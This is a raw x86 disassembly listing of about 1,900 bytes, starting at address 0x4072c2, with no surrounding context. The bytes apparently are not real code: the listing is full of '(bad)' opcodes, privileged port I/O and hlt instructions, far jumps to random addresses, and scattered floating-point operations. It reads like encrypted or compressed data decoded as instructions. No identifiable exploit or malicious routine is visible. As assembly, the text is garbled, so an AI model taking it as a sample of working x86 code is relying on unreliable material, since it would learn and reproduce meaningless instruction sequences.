  4072c2:	fsubp  st(2),st
  4072c4:	scas   al,BYTE PTR es:[edi]
  4072c5:	mov    esi,0xb4e0c3b7
  4072ca:	ret    
  4072cb:	int3   
  4072cc:	out    dx,al
  4072cd:	retf   0xbbcb
  4072d0:	fnstsw WORD PTR [edx-0x30160e4c]
  4072d6:	repz (bad) 
  4072d9:	les    eax,FWORD PTR [edx]
  4072db:	dec    BYTE PTR [ecx]
  4072dd:	aad    0x2
  4072df:	add    esp,edi
  4072e1:	or     al,0x5
  4072e3:	int    0xc7
  4072e5:	test   eax,0xc8efcbc8
  4072ea:	lock fucomi st,st(5)
  4072ed:	idiv   edx
  4072ef:	mov    ecx,0xbabfedc8
  4072f4:	into   
  4072f5:	add    dh,dl
  4072f7:	rol    eax,0x0
  4072fa:	add    ah,ah
  4072fc:	fadd   DWORD PTR [esi]
  4072fe:	out    dx,eax
  4072ff:	clc    
  407300:	(bad)  
  407302:	(bad)  
  407304:	shl    esi,0xe3
  407307:	mov    dl,0xb2
  407309:	icebp  
  40730a:	mov    dl,0xcf
  40730c:	mov    bh,0xd0
  40730e:	int    0xe4
  407310:	mov    ebx,0xcfe2cef5
  407315:	int3   
  407316:	fdivrp st(7),st
  407318:	(bad)  
  407319:	stc    
  40731a:	loop   0x40731b
  40731c:	(bad)  
  40731e:	(bad)  
  40731f:	mov    esp,0x12dc0de6
  407324:	(bad)  [eax-0x1353422a]
  40732a:	repz fchs 
  40732d:	retf   
  40732e:	repz mov eax,0xf6d8fcb5
  407334:	mov    esi,0xf8daf2e0
  407339:	sar    DWORD PTR [ecx-0x24f6083a],0xe5
  407340:	cmc    
  407341:	hlt    
  407342:	pop    es
  407343:	icebp  
  407344:	stos   DWORD PTR es:[edi],eax
  407345:	xlat   BYTE PTR ds:[ebx]
  407346:	shl    DWORD PTR [esi-0x44d2a13],cl
  40734c:	mov    cl,0xf8
  40734e:	mov    al,0xe5
  407350:	enter  0xbdcb,0xd8
  407354:	(bad)  
  407356:	fsubrp st(0),st
  407358:	loopne 0x40731c
  40735a:	(bad)  
  40735b:	rol    eax,1
  40735d:	push   es
  40735e:	loope  0x40736e
  407360:	add    eax,0xa8ee12f4
  407365:	int3   
  407366:	in     eax,dx
  407367:	aad    0xc2
  407369:	loopne 0x40731b
  40736b:	mov    edx,0xb7e5d6d1
  407370:	mov    edi,0xced6f2dc
  407375:	std    
  407376:	mov    esi,0xcbc506e7
  40737b:	loope  0x40733d
  40737d:	leave  
  40737e:	in     al,0xdc
  407380:	(bad)  
  407382:	(bad)  
  407384:	scas   eax,DWORD PTR es:[edi]
  407385:	in     al,dx
  407386:	mov    cl,0xae
  407388:	repnz stos BYTE PTR es:[edi],al
  40738a:	mov    dl,0xce
  40738c:	aam    0xba
  40738e:	aam    0xea
  407390:	sar    edi,1
  407392:	call   0xbfff7393
  407397:	in     al,dx
  407398:	sar    BYTE PTR [ebx+esi*8-0x263bfe3f],cl
  40739f:	hlt    
  4073a0:	cld    
  4073a1:	cld    
  4073a2:	repz or DWORD PTR [edx-0x2e0a4c30],ebp
  4073a9:	jecxz  0x40738f
  4073ab:	sti    
  4073ac:	jmp    0xe6174663
  4073b1:	jecxz  0x40738f
  4073b3:	call   0x33f76b6
  4073b8:	out    0xb,eax
  4073ba:	mov    ecx,0xfd9e706
  4073bf:	cli    
  4073c0:	or     DWORD PTR [edx],ecx
  4073c2:	iret   
  4073c3:	out    0xe5,al
  4073c5:	(bad)  
  4073c6:	in     al,dx
  4073c7:	fadd   st(5),st
  4073c9:	in     al,0xc5
  4073cb:	enter  0xfbc4,0xbf
  4073cf:	cli    
  4073d0:	(bad)
  4073d3:	mov    ah,0xdd
  4073d5:	icebp  
  4073d6:	ret    
  4073d7:	rcl    ch,1
  4073d9:	stc    
  4073da:	jmp    0x4073db
  4073dc:	stc    
  4073dd:	cli    
  4073de:	add    ebp,esi
  4073e0:	fld    DWORD PTR ds:0xc3c8060d
  4073e6:	iret   
  4073e7:	aad    0xc9
  4073e9:	retf   0xbafa
  4073ec:	ror    cl,0xbf
  4073ef:	sar    cl,cl
  4073f1:	std    
  4073f2:	(bad)  
  4073f4:	cli    
  4073f5:	fiadd  WORD PTR [ecx]
  4073f7:	sti    
  4073f8:	shl    esi,0xf9
  4073fb:	fadd   QWORD PTR ds:0xe4d6d6fc
  407401:	int    0x6
  407403:	jmp    0x4073d0
  407405:	enter  0xd0ee,0xb5
  407409:	jecxz  0x4073db
  40740b:	icebp  
  40740c:	mov    edx,0xb7b7efcf
  407411:	mov    dl,0xeb
  407413:	retf   0xc0c3
  407416:	fadd   st,st(0)
  407418:	aam    0xb
  40741a:	fmul   DWORD PTR [edx]
  40741c:	add    eax,0xfc09e8da
  407421:	sti    
  407422:	or     esi,edx
  407424:	ret    0xc4ac
  407427:	out    0xe5,eax
  407429:	lods   al,BYTE PTR ds:[esi]
  40742a:	mov    dl,0xe4
  40742c:	sar    eax,cl
  40742e:	repz mov esi,0xf803b9d2
  407434:	repnz rcl ch,0xdf
  407438:	fdivr  st(2),st
  40743a:	add    ebx,ebx
  40743c:	ret    
  40743d:	cli    
  40743e:	loop   0x40741d
  407440:	retf   
  407441:	jecxz  0x40742c
  407443:	(bad)  
  407444:	mov    ebp,0xe2c0b7a9
  407449:	mov    dh,0xac
  40744b:	mov    ah,0xd4
  40744d:	out    0xc5,eax
  40744f:	mov    eax,0xe8fdefba
  407454:	loop   0x407432
  407456:	in     al,dx
  407457:	(bad)  
  407459:	lds    eax,FWORD PTR [ecx]
  40745b:	add    esp,eax
  40745d:	retf   0xe07
  407460:	int    0x4
  407462:	iret   
  407463:	in     al,0xcb
  407465:	in     eax,0xb2
  407467:	int    0xd7
  407469:	cmc    
  40746a:	hlt    
  40746b:	loop   0x40743e
  40746d:	cli    
  40746e:	hlt    
  40746f:	jmp    0xee2a346b
  407474:	rol    DWORD PTR [ecx],0xd7
  407477:	jecxz  0x407469
  407479:	stc    
  40747a:	mul    esp
  40747c:	std    
  40747d:	or     edx,ebp
  40747f:	jmp    0xbcbd:0xeddbc804
  407486:	ffreep st(4)
  407488:	retf   
  407489:	out    0xb0,eax
  40748b:	jmp    0xd9d9:0xf9dbb9ea
  407492:	cld    
  407493:	loope  0x407498
  407495:	mov    ecx,0xc1d2f4d1
  40749a:	out    0x3,al
  40749c:	fdivr  st(6),st
  40749e:	push   es
  40749f:	jmp    0x40746a
  4074a1:	loopne 0x407489
  4074a3:	push   es
  4074a4:	in     eax,dx
  4074a5:	ror    edx,0xce
  4074a8:	xlat   BYTE PTR ds:[ebx]
  4074a9:	lock shl ebp,0xcc
  4074ad:	mov    cl,0xf3
  4074af:	in     al,0xf8
  4074b1:	jmp    0x4074b2
  4074b3:	fptan  
  4074b5:	fdivrp st(0),st
  4074b7:	test   BYTE PTR ds:0x5dbead4,0xd0
  4074be:	cmc    
  4074bf:	(bad)
  4074c2:	or     ah,dl
  4074c4:	in     eax,0xe7
  4074c6:	xlat   BYTE PTR ds:[ebx]
  4074c7:	ror    eax,0xf3
  4074ca:	jmp    0xf12d3ab9
  4074cf:	ror    bl,1
  4074d1:	mov    ch,0xd9
  4074d3:	hlt    
  4074d4:	idiv   eax
  4074d6:	into   
  4074d7:	neg    ecx
  4074d9:	icebp  
  4074da:	inc    DWORD PTR [eax]
  4074dc:	add    eax,0xebffe8c2
  4074e1:	loope  0x4074f6
  4074e3:	in     al,dx
  4074e4:	int3   
  4074e5:	iret   
  4074e6:	(bad)  
  4074e7:	mov    bh,0xc6
  4074e9:	out    0xac,eax
  4074eb:	fxch   st(6)
  4074ed:	shl    cl,cl
  4074ef:	jmp    0xfd094bd3
  4074f4:	fdivp  st(2),st
  4074f6:	int    0xfb
  4074f8:	fild   WORD PTR [ecx]
  4074fa:	loop   0x4074e1
  4074fc:	(bad)
  4074ff:	iret   
  407500:	ret    
  407501:	out    0xf8,al
  407503:	or     edx,edx
  407505:	repnz (bad) 
  407507:	scas   al,BYTE PTR es:[edi]
  407508:	call   0xe2014c04
  40750d:	iret   
  40750e:	mul    esi
  407510:	icebp  
  407511:	fdivr  st,st(7)
  407513:	clc    
  407514:	shl    bh,1
  407516:	hlt    
  407517:	rcl    cl,0xd8
  40751a:	rcl    ah,0xf6
  40751d:	enter  0xc400,0xcb
  407521:	in     eax,dx
  407522:	out    0xf8,al
  407524:	ret    0xc1d1
  407527:	out    dx,eax
  407528:	loope  0x40751b
  40752a:	mov    bl,0xb6
  40752c:	rcr    bh,0xeb
  40752f:	leave  
  407530:	not    esi
  407532:	leave  
  407533:	fdivr  DWORD PTR [ebp-0x51c11]
  407539:	cli    
  40753a:	(bad)  
  40753b:	fcomi  st,st(4)
  40753d:	rcr    eax,0xdb
  407540:	push   es
  407541:	jmp    0x407531
  407543:	or     eax,ebx
  407545:	lods   al,BYTE PTR ds:[esi]
  407546:	icebp  
  407547:	retf   0xb1b7
  40754a:	enter  0xb5c0,0xd9
  40754e:	cmc    
  40754f:	out    dx,eax
  407550:	mov    ecx,0x1e9d0ba
  407555:	sti    
  407556:	fsubp  st(4),st
  407558:	add    al,cl
  40755a:	add    edi,edx
  40755c:	or     BYTE PTR [esi],al
  40755e:	add    al,0xf4
  407560:	call   0xf009852f
  407565:	out    0xd3,al
  407567:	cmc    
  407568:	ror    ch,1
  40756a:	aam    0xcd
  40756c:	hlt    
  40756d:	jmp    0xe1d9:0xd0b9bab8
  407574:	not    cl
  407576:	cli    
  407577:	sar    ebx,0xe5
  40757a:	mov    ebp,0xe2f902d2
  40757f:	fisttp WORD PTR [edx]
  407581:	(bad)  
  407582:	call   0xb030338b
  407587:	into   
  407588:	fucom  st(4)
  40758a:	fidivr DWORD PTR [ebx-0x32343a07]
  407590:	fcmovu st,st(1)
  407592:	cmc    
  407593:	jmp    0xd603:0xe7b9edfe
  40759a:	rol    BYTE PTR [edi],0x6
  40759d:	jmp    0x407575
  40759f:	add    bl,al
  4075a1:	fisttp DWORD PTR [ebx]
  4075a3:	iret   
  4075a4:	(bad)  
  4075a5:	mov    ebp,0xf3ecf0ea
  4075aa:	rcl    cl,cl
  4075ac:	shl    ah,0xb8
  4075af:	(bad)  
  4075b0:	(bad)  
  4075b2:	mov    eax,0x3edc8f6
  4075b7:	(bad)  
  4075b8:	inc    BYTE PTR [esi]
  4075ba:	push   es
  4075bb:	add    al,0x7
  4075bd:	fcmovu st,st(5)
  4075bf:	aam    0xe
  4075c1:	dec    bh
  4075c3:	repz retf 
  4075c5:	retf   0xe8a5
  4075c8:	mov    dl,0xf5
  4075ca:	loope  0x4075a6
  4075cc:	in     al,dx
  4075cd:	scas   al,BYTE PTR es:[edi]
  4075ce:	fdivr  st,st(3)
  4075d0:	mov    eax,0xedfbe9f1
  4075d5:	in     eax,dx
  4075d6:	repnz out dx,al
  4075d8:	fiadd  WORD PTR ds:0xe2c7de04
  4075de:	sti    
  4075df:	sti    
  4075e0:	fdivr  st,st(2)
  4075e2:	or     al,BYTE PTR [eax]
  4075e4:	loopne 0x4075cd
  4075e6:	enter  0xe7bc,0xcc
  4075ea:	retf   0xece7
  4075ed:	imul   al
  4075ef:	cmc    
  4075f0:	mov    ebp,0xfef2bef9
  4075f5:	rcr    ecx,0x3
  4075f8:	fdiv   st,st(0)
  4075fa:	rol    dl,1
  4075fc:	loopne 0x4075df
  4075fe:	rcr    bl,0xc5
  407601:	loope  0x407607
  407603:	push   cs
  407604:	loope  0x4075d3
  407606:	jecxz  0x4075eb
  407608:	out    dx,al
  407609:	imul   esi
  40760b:	stc    
  40760c:	repz shl esp,1
  40760f:	clc    
  407610:	cmc    
  407611:	jecxz  0x4075f5
  407613:	xlat   BYTE PTR ds:[ebx]
  407614:	sar    edx,0xe7
  407617:	(bad)  
  407618:	loop   0x407600
  40761a:	jmp    0xe909:0xdee2e0c4
  407621:	out    dx,eax
  407622:	repnz loope 0x4075f4
  407625:	in     al,dx
  407626:	jecxz  0x40761e
  407628:	ret    0xd0eb
  40762b:	out    dx,al
  40762c:	(bad)
  40762f:	fucomp st(5)
  407631:	jmp    0x407600
  407633:	lock enter 0xd0f0,0xe2
  407638:	add    dl,ch
  40763a:	fnsetpm(287 only) 
  40763c:	fadd   st(4),st
  40763e:	lds    eax,FWORD PTR [edx]
  407640:	loopne 0x40764f
  407642:	int    0x7
  407644:	ror    edx,0xe9
  407647:	lods   al,BYTE PTR ds:[esi]
  407648:	rcl    eax,cl
  40764a:	into   
  40764b:	leave  
  40764c:	mov    ah,0xb5
  40764e:	int3   
  40764f:	int3   
  407650:	hlt    
  407651:	fcmovu st,st(7)
  407653:	loop   0x40764d
  407655:	into   
  407656:	mov    ch,0xbc
  407658:	(bad)  
  407659:	lock (bad) 
  40765b:	fcmovb st,st(4)
  40765d:	fmul   DWORD PTR [esi]
  40765f:	(bad)  
  407660:	psrad  mm4,mm1
  407663:	(bad)  
  407664:	test   eax,0xf6edcfd8
  407669:	stos   BYTE PTR es:[edi],al
  40766a:	in     eax,dx
  40766b:	out    0xe0,eax
  40766d:	out    0xfa,eax
  40766f:	(bad)
  407672:	(bad)  
  407674:	call   0x32e3e75
  407679:	fdiv   st,st(1)
  40767b:	retf   0x1e3
  40767e:	(bad)  
  40767f:	in     eax,dx
  407680:	or     DWORD PTR [esi+ebx*8],eax
  407683:	in     eax,dx
  407684:	loopne 0x407666
  407686:	jmp    0xb4eb:0xfbf6c1f2
  40768d:	rcl    al,cl
  40768f:	sar    cl,cl
  407691:	(bad)  
  407692:	(bad)  
  407693:	mov    ah,0xc1
  407695:	mov    esp,0xd6c5bfe6
  40769a:	shr    ecx,0xe6
  40769d:	cld    
  40769e:	cmc    
  40769f:	or     cl,BYTE PTR [eax]
  4076a1:	loope  0x4076a4
  4076a3:	or     dl,cl
  4076a5:	out    0xd3,eax
  4076a7:	ret    
  4076a8:	repz test dh,0xee
  4076ac:	mov    al,0xe6
  4076ae:	mov    al,0xce
  4076b0:	fninit 
  4076b2:	in     eax,dx
  4076b3:	idiv   BYTE PTR [esi-0x1d223142]
  4076b9:	(bad)  
  4076bb:	or     ebx,esp
  4076bd:	mov    DWORD PTR [eax+eax*1],0xd8e9fa09
  4076c4:	mov    ecx,0xc4c0caad
  4076c9:	sti    
  4076ca:	mov    ch,0xc6
  4076cc:	retf   0xeff6
  4076cf:	in     al,0xe8
  4076d1:	mov    dl,0xd0
  4076d3:	rol    ebx,cl
  4076d5:	jecxz  0x4076ce
  4076d7:	fdivrp st(2),st
  4076d9:	jecxz  0x4076d3
  4076db:	repnz jecxz 0x4076d3
  4076de:	(bad)  
  4076df:	hlt    
  4076e0:	jmp    0xde444aad
  4076e5:	shl    al,1
  4076e7:	shr    bh,0xe5
  4076ea:	into   
  4076eb:	fcmovbe st,st(4)
  4076ed:	mov    dh,0xc4
  4076ef:	mov    esi,0xcabcefcc
  4076f4:	aam    0xef
  4076f6:	icebp  
  4076f7:	(bad)  
  4076f8:	(bad)  
  4076f9:	add    dl,ch
  4076fb:	(bad)  
  4076fc:	rol    ch,1
  4076fe:	fucom  st(3)
  407700:	add    eax,0xe70ae608
  407705:	jmp    0xe6ce:0xf5cfc3b0
  40770c:	mov    dh,0xe5
  40770e:	stc    
  40770f:	(bad)  
  407710:	mov    dh,0xe9
  407712:	fmulp  st(4),st
  407714:	mov    eax,0xe5d2d7f6
  407719:	lock test DWORD PTR [eax],0xe6ea00fc
  407720:	push   es
  407721:	add    cl,bl
  407723:	fmul   st,st(0)
  407725:	shl    BYTE PTR [ecx-0xc093d3e],1
  40772b:	retf   0xe4d4
  40772e:	(bad)  
  40772f:	mov    eax,0xc3caecf0
  407734:	fcmovnu st,st(1)
  407736:	rol    BYTE PTR ds:0xfcc3dcd7,1
  40773c:	add    dl,dh
  40773e:	or     cl,BYTE PTR [edi]
  407740:	iret   
  407741:	aam    0xe7
  407743:	std    
  407744:	jmp    0xd7e7:0xf0dcf1ee
  40774b:	mov    ebx,0xddeed1da
  407750:	mov    esi,0xefc9efce
  407755:	mov    dh,0x7
  407757:	fdivrp st(2),st
  407759:	out    0xa,eax
  40775b:	cld    
  40775c:	(bad)  
  40775e:	loop   0x407720
  407760:	jmp    0x40775f
  407762:	fiadd  WORD PTR ds:0xf6e6f1f3
  407768:	rol    ch,0xc7
  40776b:	mov    ebx,0xc6c5f6ec
  407770:	fidivr WORD PTR [eax-0x24044406]
  407776:	mov    ch,0xcd
  407778:	int3   
  407779:	add    al,BYTE PTR [ebx]
  40777b:	loope  0x40775f
  40777d:	add    ecx,DWORD PTR [eax]
  40777f:	jmp    esp
  407781:	ret    0xfacb
  407784:	mov    ebp,0xb5f3ecad
  407789:	retf   0xfae6
  40778c:	aad    0xba
  40778e:	mov    ecx,0xc8dbf9ca
  407793:	int    0xfa
  407795:	hlt    
  407796:	mov    ebp,0xc2fbbed9
  40779b:	jmp    0x407779
  40779d:	add    eax,0xf30d01da
  4077a2:	or     al,0x11
  4077a4:	faddp  st(6),st
  4077a6:	neg    ch
  4077a8:	loopne 0x40778f
  4077aa:	out    0xc2,al
  4077ac:	int3   
  4077ad:	sti    
  4077ae:	int    0xde
  4077b0:	(bad)  
  4077b2:	xlat   BYTE PTR ds:[ebx]
  4077b3:	mov    ah,0xc9
  4077b5:	hlt    
  4077b6:	out    dx,eax
  4077b7:	mov    esp,0xebe6d1df
  4077bc:	leave  
  4077bd:	loopne 0x4077a0
  4077bf:	fadd   st(6),st
  4077c1:	retf   0xc9e3
  4077c4:	in     al,dx
  4077c5:	fadd   st(0),st
  4077c7:	(bad)  
  4077c9:	mov    ch,0xb4
  4077cb:	mov    cl,0xd5
  4077cd:	aam    0xd0
  4077cf:	stc    
  4077d0:	mov    dh,0xfa
  4077d2:	not    ebx
  4077d4:	mov    bh,0xd1
  4077d6:	in     al,dx
  4077d7:	shl    dh,cl
  4077d9:	add    DWORD PTR [edi],eax
  4077db:	fsubr  st(4),st
  4077dd:	xlat   BYTE PTR ds:[ebx]
  4077de:	out    dx,al
  4077df:	add    ebp,esi
  4077e1:	into   
  4077e2:	int3   
  4077e3:	add    BYTE PTR [edx-0x363b3844],dh
  4077e9:	loopne 0x4077e0
  4077eb:	enter  0xb2c7,0xf7
  4077ef:	(bad)  
  4077f0:	cli    
  4077f1:	jmp    0xccdc:0xfad4efdb
  4077f8:	int    0xf6
  4077fa:	rcr    bl,0xfd
  4077fd:	out    dx,eax
  4077fe:	fisttp DWORD PTR [ebx]
  407800:	aam    0xf9
  407802:	iret   
  407803:	retf   0xc4b1
  407806:	out    dx,eax
  407807:	mov    esp,0xebadb7b1
  40780c:	loopne 0x4077f4
  40780e:	mov    ecx,0xebcab3b5
  407813:	rol    ebx,cl
  407815:	idiv   ecx
  407817:	mul    ebp
  407819:	mov    esp,0xe900c100
  40781e:	leave  
  40781f:	out    dx,al
  407820:	(bad)  
  407822:	out    0xe0,eax
  407824:	int    0xe9
  407826:	loop   0x4077ef
  407828:	(bad)  
  407829:	retf   0xe5f1
  40782c:	out    dx,al
  40782d:	les    esi,FWORD PTR [ecx-0x234d3211]
  407833:	int    0xb9
  407835:	div    eax
  407837:	int3   
  407838:	lds    ecx,FWORD PTR [ebx]
  40783a:	or     al,bl
  40783c:	add    eax,0xd5fa04d0
  407841:	aam    0xa
  407843:	repnz icebp 
  407845:	enter  0xaebc,0xc7
  407849:	jmp    0xaf30691a
  40784e:	retf   0xb9b6
  407851:	std    
  407852:	mov    ch,0xf9
  407854:	in     eax,dx
  407855:	fcmovnbe st,st(1)
  407857:	ret    
  407858:	ret    0xe4e1
  40785b:	add    bl,ch
  40785d:	pop    es
  40785e:	sti    
  40785f:	fisttp QWORD PTR ds:0xbd1106c9
  407865:	jmp    0xfc2e5c1a
  40786a:	mov    ch,0xb6
  40786c:	in     al,dx
  40786d:	imul   ecx
  40786f:	test   al,0xcd
  407872:	jmp    0xc1224630
  407877:	add    bl,dl
  407879:	add    al,dl
  40787b:	(bad)  
  40787c:	out    0xe1,al
  40787e:	or     bl,bh
  407880:	in     eax,0x0
  407882:	fxch   st(7)
  407884:	mov    ecx,0xd2d2caf2
  407889:	mov    cl,0xcc
  40788b:	loopne 0x40783e
  40788d:	hlt    
  40788e:	sti    
  40788f:	jmp    0xbc2f536e
  407894:	jecxz  0x407885
  407896:	mov    edi,0xf4e703cd
  40789c:	hlt    
  40789d:	or     esp,edx
  40789f:	fild   DWORD PTR [esp+ebx*8]
  4078a2:	fcmovbe st,st(2)
  4078a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078a5:	(bad)  [edi-0x132e3609]
  4078ab:	(bad)  
  4078ad:	in     al,dx
  4078ae:	in     al,dx
  4078af:	(bad)  
  4078b0:	leave  
  4078b1:	sti    
  4078b2:	jmp    0x40786d
  4078b4:	fcmovb st,st(1)
  4078b6:	mov    esp,0xd1c1fdee
  4078bb:	jmp    0xd0a:0xf900fae5
  4078c2:	jmp    0x4078a5
  4078c4:	mov    bl,0xe1
  4078c6:	mov    cl,0xf2
  4078c8:	loop   0x40787d
  4078ca:	hlt    
  4078cb:	enter  0xc0e6,0xc5
  4078cf:	sar    BYTE PTR [ebx-0x9fc11fd],1
  4078d5:	cli    
  4078d6:	sti    
  4078d7:	sti    
  4078d8:	pop    es
  4078d9:	(bad)  
  4078da:	repz fadd DWORD PTR [esi]
  4078dd:	jmp    esp
  4078df:	push   cs
  4078e0:	les    ecx,FWORD PTR ds:0xdcade1c1
  4078e6:	ret    0xb2c5
  4078e9:	mov    dl,0xe1
  4078eb:	xlat   BYTE PTR ds:[ebx]
  4078ec:	shr    esi,1
  4078ee:	mov    ebx,0xfacfb9f1
  4078f3:	add    ebp,ebx
  4078f5:	fptan  
  4078f7:	std    
  4078f8:	(bad)  
  4078fa:	pop    es
  4078fb:	aam    0xfb
  4078fd:	std    
  4078fe:	call   0xda4c7410
  407903:	cld    
  407904:	(bad)  
  407905:	call   0xe81247e9
  40790a:	int3   
  40790b:	mov    cl,0xd8
  40790d:	shr    edx,1
  40790f:	hlt    
  407910:	retf   0xdef5
  407913:	fld    QWORD PTR [ebx]
  407915:	mov    edx,0x2d1bddc
  40791a:	cmc    
  40791b:	ret    0xc6fc
  40791e:	fisttp QWORD PTR [ebx]
  407920:	(bad)  
  407921:	fdivr  st,st(6)
  407923:	pop    es
  407924:	(bad)  
  407925:	fnsave [edx-0x1e0c2d17]
  40792b:	(bad)
  40792f:	fidiv  DWORD PTR [ebx-0x2e423524]
  407935:	int    0xbd
  407937:	(bad)  
  407939:	icebp  
  40793a:	jmp    0xc7ea:0xd605d1fe
  407941:	or     eax,DWORD PTR [edi]
  407943:	into   
  407944:	scas   eax,DWORD PTR es:[edi]
  407945:	out    dx,al
  407946:	loopne 0x40791e
  407948:	in     eax,dx
  407949:	ret    0xb1c4
  40794c:	repnz int 0xd3
  40794f:	mov    al,0xf4
  407951:	fdivr  st(4),st
  407953:	fsubp  st(7),st
  407955:	fsubr  st,st(4)
  407957:	repnz mov edi,0xe2fe02e0
  40795d:	or     esp,eax
  40795f:	std    
  407960:	pop    es
  407961:	pop    es
  407962:	loopne 0x40795d
  407964:	ret    
  407965:	ror    ebp,cl
  407967:	rcl    edx,1
  407969:	mov    esp,0xf0c0d4e6
  40796e:	aam    0xbf
  407970:	call   0xdb0f3d5d
  407975:	fsubr  st(1),st
  407977:	loope  0x407938
  407979:	add    al,dh
  40797b:	jmp    0xd5468171
  407980:	fadd   QWORD PTR [edi]
  407982:	(bad)  
  407983:	call   0xc0ee4c56
  407988:	icebp  
  407989:	xlat   BYTE PTR ds:[ebx]
  40798a:	mov    bh,0xc4
  40798c:	loopne 0x40798d
  40798e:	out    dx,eax
  40798f:	test   ch,0xd1
  407992:	(bad)  
  407994:	cli    
  407995:	enter  0xc700,0xf9
  407999:	(bad)  
  40799b:	(bad)  
  40799c:	cld    
  40799d:	retf   0xfac5
  4079a0:	add    dl,al
  4079a2:	or     esp,edi
  4079a4:	enter  0xb2ae,0xd6
  4079a8:	ret    
  4079a9:	(bad)  
  4079aa:	leave  
  4079ab:	(bad)  
  4079ac:	neg    bh
  4079ae:	fsubp  st(5),st
  4079b0:	aad    0xfd
  4079b2:	(bad)  
  4079b4:	mov    ecx,0xbfc3f7f5
  4079b9:	rcr    esi,0x2
  4079bc:	add    al,0xf7
  4079be:	push   cs
  4079bf:	loopne 0x4079cb
  4079c1:	push   es
  4079c2:	in     al,dx
  4079c3:	add    esi,eax
  4079c5:	mov    eax,0xd6c0caaf
  4079ca:	xlat   BYTE PTR ds:[ebx]
  4079cb:	mov    ebx,0xdfe8e7b9
  4079d0:	in     al,0xfa
  4079d2:	add    ch,dh
  4079d4:	cli    
  4079d5:	xlat   BYTE PTR ds:[ebx]
  4079d6:	in     eax,dx
  4079d7:	test   edi,0xe6f7c404
  4079dd:	clc    
  4079de:	jecxz  0x40799c
  4079e0:	aad    0x0
  4079e2:	fsubr  st,st(6)
  4079e4:	in     eax,0xa6
  4079e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079e7:	jmp    0xf02456b5
  4079ec:	shl    al,1
  4079ee:	mov    ebx,0xdbfbf0de
  4079f3:	fdivp  st(4),st
  4079f5:	int3   
  4079f6:	ret    0xe4b8
  4079f9:	repnz add ch,ah
  4079fc:	jmp    0xe90b:0xfdffc50b
  407a03:	in     eax,dx
  407a04:	out    0xe8,al
  407a06:	loop   0x4079b0
  407a08:	(bad)  
  407a0a:	shl    cl,cl
  407a0c:	mov    edx,0xd2e4d0cd
  407a11:	fcomi  st,st(3)
  407a13:	(bad)  
  407a14:	fcomip st,st(3)
  407a16:	in     al,dx
  407a17:	fsubr  st(2),st
  407a19:	icebp  
  407a1a:	fnstcw WORD PTR [eax-0x27090630]
  407a20:	aad    0xd
  407a22:	in     al,dx
  407a23:	jmp    0x4079d3
  407a25:	scas   al,BYTE PTR es:[edi]
  407a26:	in     al,dx
  407a27:	out    dx,al
  407a28:	out    dx,eax
  407a29:	(bad)  
  407a2a:	shl    dl,1
  407a2c:	fyl2x  
  407a2e:	lods   eax,DWORD PTR ds:[esi]
  407a2f:	cmc    
  407a30:	mov    ah,0xfe
  407a32:	sti    
  407a33:	ror    ch,1
  407a35:	out    0x6,eax
  407a37:	(bad)  
  407a38:	shl    ch,1
  407a3a:	add    esi,esp
  407a3c:	mov    bh,0x0
  407a3f:	fdivp  st(6),st
  407a41:	or     eax,ebp
  407a43:	icebp  
  407a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a45:	shl    edi,1
  407a47:	cmc    
  407a48:	into   
  407a49:	aam    0xac
  407a4b:	call   0xde117a31
  407a50:	mov    ebp,0xe2ecf3b5
  407a55:	clc    
  407a56:	repz out 0xd1,eax
  407a59:	loopne 0x407a3f
  407a5b:	loope  0x407a64
  407a5d:	clc    
  407a5e:	out    0xea,eax
  407a60:	or     al,0xc8
  407a62:	dec    DWORD PTR [edi]
  407a64:	lock loope 0x407a58
  407a67:	jecxz  0x407a4d
  407a69:	div    BYTE PTR [edx+eiz*8-0x252c134c]
  407a70:	fmulp  st(0),st
  407a72:	call   0xdf187b63
  407a77:	lock (bad) 
  407a79:	cmc    
  407a7a:	add    eax,eax
  407a7c:	stc    
  407a7d:	(bad)  
  407a7e:	fsubp  st(6),st
  407a80:	retf   0xe20e
  407a83:	jmp    0xdcf32e70
  407a88:	hlt    
  407a89:	out    dx,eax
  407a8a:	mov    al,0xcf
  407a8c:	aam    0xc7
  407a8e:	enter  0xd9f1,0xee
  407a92:	fldz   
  407a94:	mov    esp,0xc7c1d3bc
  407a99:	add    bh,al
  407a9b:	fcmove st,st(2)
  407a9d:	or     ebx,ecx
  407a9f:	pop    es
  407aa0:	aam    0xed
  407aa2:	add    eax,0xf7d7ebf8
  407aa7:	shl    DWORD PTR [ebp-0x4b161e31],0xcc
  407aae:	inc    ch
  407ab0:	mul    ah
  407ab2:	in     eax,dx
  407ab3:	ret    
  407ab4:	mov    esi,0xd605bdf2
  407ab9:	aam    0x4
  407abb:	cli    
  407abc:	add    eax,0xc905cb01
  407ac1:	(bad)  
  407ac2:	in     eax,dx
  407ac3:	fmul   st,st(1)
  407ac5:	mov    esi,0xb3bcc7e8
  407aca:	iret   
  407acb:	icebp  
  407acc:	sti    
  407acd:	ror    ebp,cl
  407acf:	mov    eax,0xcefadeef
  407ad4:	fldz   
  407ad6:	rcr    ah,0xdb
  407ad9:	(bad)  
  407ada:	(bad)  
  407adb:	retf   
  407adc:	jecxz  0x407aae
  407ade:	not    dh
  407ae0:	aad    0xc9
  407ae2:	rcr    ebp,0xee
  407ae5:	out    0xc1,al
  407ae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ae8:	out    dx,al
  407ae9:	hlt    
  407aea:	aam    0xb6
  407aec:	bnd jmp 0xfd0e7ab9
  407af2:	mov    ecx,0xb9b6defc
  407af7:	neg    ch
  407af9:	idiv   ch
  407afb:	(bad)  
  407afc:	clc    
  407afd:	fucom  st(3)
  407aff:	jmp    0xcbe2:0xebfcf3de
  407b06:	mov    bh,0xa4
  407b08:	call   0xfc016fe2
  407b0d:	mov    al,0xff
  407b0f:	shl    cl,1
  407b11:	enter  0xcfeb,0xf9
  407b15:	aad    0xcd
  407b17:	out    0xf2,eax
  407b19:	add    edi,ebx
  407b1b:	ret    0xc5
  407b1e:	out    0xe5,eax
  407b20:	fild   WORD PTR [edx]
  407b22:	fscale 
  407b24:	test   al,0xa8
  407b26:	mov    dl,0xc9
  407b28:	mov    ch,0xe9
  407b2a:	enter  0xb9d6,0xee
  407b2e:	mov    dh,0xb6
  407b30:	sar    BYTE PTR [ecx-0x2d421cfe],1
  407b36:	mov    ebp,0xbdcc6d6
  407b3b:	or     esi,esp
  407b3d:	aad    0xe8
